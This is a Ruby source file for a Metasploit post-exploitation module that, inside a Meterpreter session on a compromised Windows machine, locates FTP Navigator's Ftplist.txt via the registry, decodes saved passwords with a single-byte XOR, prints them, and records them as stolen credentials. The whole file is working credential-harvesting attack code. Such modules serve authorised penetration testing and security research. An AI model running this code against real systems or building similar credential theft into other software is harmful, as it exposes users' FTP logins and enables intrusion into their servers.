##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Windows Gather FTP Navigator Saved Password Extraction',
      'Description'    => %q{
        This module extracts saved passwords from the FTP Navigator FTP client.
        It will decode the saved passwords and store them in the database.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['theLightCosine'],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ]
    ))
  end

  def run
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Navigator_is1\\"
    val_name = "InstallLocation"
    installdir = registry_getvaldata(key, val_name) || "c:\\FTP Navigator\\"

    path = "#{installdir}Ftplist.txt"

    begin
      ftplist = client.fs.file.new(path,'r')
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Unable to open Ftplist.txt: #{e}")
      print_error("FTP Navigator May not Ne Installed")
      return
    end

    lines = ftplist.read.split("\n")
    lines.each do |line|
      next if line.include? "Anonymous=1"
      next unless line.include? ";Password="

      dpass    = ""
      username = ""
      server   = ""
      port     = ""

      line.split(";").each do |field|
        next if field.include? "SavePassword"

        if field.include? "Password="
          epass = split_values(field)
          dpass = decode_pass(epass)
        elsif field.include? "User="
          username = split_values(field)
        elsif field.include? "Server="
          server = split_values(field)
        elsif field.include? "Port="
          port = split_values(field)
        end
      end

      print_good("Host: #{server} Port: #{port} User: #{username} Pass: #{dpass}")
      service_data = {
        address: Rex::Socket.getaddress(server),
        port: port,
        protocol: "tcp",
        service_name: "ftp",
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        username: username,
        private_data: dpass,
        private_type: :password
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        access_level: "User",
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
    end
  end

  def split_values(field)
    values = field.split("=",2)
    return values[1]
  end

  def decode_pass(encoded)
    decoded = ""
    encoded.unpack("C*").each do |achar|
      decoded << (achar ^ 0x19)
    end
    return decoded
  end
end
